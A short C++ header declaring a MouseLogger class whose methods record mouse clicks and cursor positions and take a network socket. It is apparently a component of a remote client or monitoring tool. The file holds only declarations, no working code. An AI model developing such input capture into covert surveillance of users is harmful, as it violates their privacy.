#pragma once

#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <thread>
#include "Client.h"

class MouseLogger
{
public:
	MouseLogger();
	~MouseLogger();

	void recordMouseClicks(SOCKET sock);
	void recordMousePos(SOCKET sock);
};
